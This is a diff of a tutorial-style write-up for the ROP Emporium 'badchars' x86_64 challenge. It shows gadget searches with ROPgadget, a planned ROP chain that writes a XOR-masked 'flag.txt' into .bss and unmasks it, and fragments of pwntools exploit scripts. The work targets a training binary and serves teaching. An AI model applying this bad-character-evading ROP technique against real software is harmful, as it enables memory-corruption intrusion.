@@ -2,8 +2,9 @@
 Title: Ropemporium x86_64 bad chars
 Date: 2023-06-05
 Tags: [linux, python, ROP, x86_64, ropemporium]
-Categories: [write-up]
+Categories: [tutorial]
 Author: cdpointpoint
+Draft: False
 ---
 
 # bad chars
@@ -165,16 +166,11 @@ If one byte is a bad char it is changed by 0xeb
     │   │╎│╎│   0x000009c0      488b45c8       mov rax, qword [var_38h]
     │   │╎│╎│   0x000009c4      c64405e0eb     mov byte [rbp + rax - 0x20], 0xeb
 
-If we try to apply write4 technic on this programm we will obtain : 
 
-    badchars by ROP Emporium
-    x86_64
+This time the `print_file`function is not in the `badchars` program but in the library.
+But fortunatly, a not called but existing function `usefulFunction` call it and then print_file is refenced in the PLT table.
 
-    badchars are: 'x', 'g', 'a', '.'
-    > Thank you!
-    Failed to open file: fl\xeb\xeb\xebt\xebt
-
-(the script is in the end of the post )
+Elsewhere, without leak we dont have the adresse of print_file in the lib.
 
 ```
 gef➤  disas usefulFunction
@@ -188,6 +184,17 @@ Dump of assembler code for function usefulFunction:
    0x0000000000400627 <+16>:	ret
 End of assembler dump.
 ```
+
+If we try to apply write4 technic on this program we will obtain :
+
+    badchars by ROP Emporium
+    x86_64
+
+    badchars are: 'x', 'g', 'a', '.'
+    > Thank you!
+    Failed to open file: fl\xeb\xeb\xebt\xebt
+
+(the script is in the end of the post )
 
 Some gadget are suggested to us :
 
@@ -280,7 +287,41 @@ nth paddr        size vaddr       vsize perm name
 
 We can try .bss : 0x00601038
 
+
+## Building the attack
+
+
+As for write4 we can write "flag.txt" in memory en then call print_file
+
+But the 3 forbiddens chars have to be changed.
+The classical technic is to submit a message wirh the bad chars xored with a mask and in a second stage xor the data in memory with the same mask
+
+
+
 ## looking for gadgets :
+
+Of course the gadgets are in the usefulGadgets section but we want maniplate ROPGadget.
+
+First, for write in memory purpose : searching a "mov [rxx], ryy" instruction.
+Else we can look for "add", "xor" ...
+
+```sh
+05_badchars$ ROPgadget --binary badchars|grep 'mov.*\[r..],'
+0x0000000000400635 : mov dword ptr [rbp], esp ; ret
+0x0000000000400634 : mov qword ptr [r13], r12 ; ret
+```
+
+We need a xor gadget :
+
+```sh
+05_badchars# ROPgadget --binary badchars |grep "xor"
+0x0000000000400628 : xor byte ptr [r15], r14b ; ret
+0x0000000000400629 : xor byte ptr [rdi], dh ; ret
+```
+We can do that with the "xor byte ptr [r15], r14b ; ret" gadget.
+This gadget allow to xor one byte each time, the we will apply it 4 times.
+
+To use it we need to set r14 and r15.
 
 ```sh
 05_badchars# ROPgadget --binary badchars |grep "pop r14"
@@ -290,29 +331,13 @@ We can try .bss : 0x00601038
 0x000000000040069b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
 0x000000000040069f : pop rbp ; pop r14 ; pop r15 ; ret
 0x000000000040069d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
-
-
-0x00000000004006a2 : pop r15 ; ret
-
-05_badchars# ROPgadget --binary badchars |grep "xor"
-0x0000000000400628 : xor byte ptr [r15], r14b ; ret
-0x0000000000400629 : xor byte ptr [rdi], dh ; ret
-
-05_badchars# grep "pop rdi" ropgadget.txt
-0x04006a3 : pop rdi ; ret
-
-
-write in memory
-0x0000000000400634 : mov qword ptr [r13], r12 ; ret
 ```
+ok with the first gadget we can set r12, r13 to write in memory and r15 and r14 to xor a byte.
 
-## Building the ropchaine
 
+### ropchaine synoptic
 
-As for write4 we can write "flag.txt" in memory en then call print_file
-
-But the 3 forbiddent chars have to be changes.
-The classical technic is to put the bad chr xored with a mask and in a second stage xor the data in memory with the same mask
+Because our xor gadget xor only one char a time we wan xor only the needed bytes.
 
 Here xga. must be xored.
 
@@ -320,47 +345,41 @@ flag.txt
 00111010
 
 we can make a function xorchain(string, filter, mask) :
-xor the bytes seleted by a filter (mask too sorry)  and with a xor mask value.
+xor the bytes selected by a filter (mask of characters to xor) and with a xor mask value.
+We choose the xor mask 0b11 (3)
 
-xorchain("flag.txt","00111010", 3)
+xoredflag = xorchain("flag.txt","00111010", 3)
 
-Return
- - flag.txt masked
- - the ropchain
+Return "flag.txt" masked : "flbd-t{t"
 
-We can do that with the "xor byte ptr [r15], r14b ; ret" gadget.
 
-This gadget allow to xor one byte each time, the we will apply it 4 times.
-
-### ropchaine synoptic
-
-Ecriture du nom de fichier modifié.
+write masked file name.
 - pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
-- xoredflag
-- @bss
-- 3
-- @bss+2
-- mov qword ptr [r13], r12 ; ret
+- xoredflag for r12  write content
+- @bss      for r13, write target
+- 3         for r14, xor mask 
+- @bss+2    for r15, target adresse of char 2
+- mov qword ptr [r13], r12 ; ret    : do the initial write
 
-xor de .bss+2
+xor of .bss+2
 - xor byte ptr [r15], r14b ; ret
-- pop r15
 
-xor de .bss+3
+xor of .bss+3
+- pop r15
 - @bss+3
 - xor byte ptr [r15], r14b ; ret
-- pop r15
 
 xor de .bss+4
+- pop r15
 - @bss+4
 - xor byte ptr [r15], r14b ; ret
 
-xor de .bss+4
+xor de .bss+6
 - pop r15
 - @bss+6
 - xor byte ptr [r15], r14b ; ret
 
-Appel de print_file(@bss)
+call print_file(@bss)
 - pop rdi
 - @bss
 - print_file
@@ -378,7 +397,7 @@ from pwn import *
 import time
 import sys
 
-# break apres le read dans pwnme
+# break after read in pwnme
 gs='''
 b *pwnme+150
 c
@@ -501,14 +520,14 @@ from pwn import *
 import time
 import sys
 
-# Attaque naive de badchars avec l'approche de write4 
+# Attaque naive de badchars avec l'approche de write4
 # break apres le read dans pwnme
 gs='''
 b *pwnme+268
 c
 '''
 
-# Gadgets 
+# Gadgets
 # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
 pop_r12345=0x40069c
 # mov qword ptr [r13], r12 ; ret
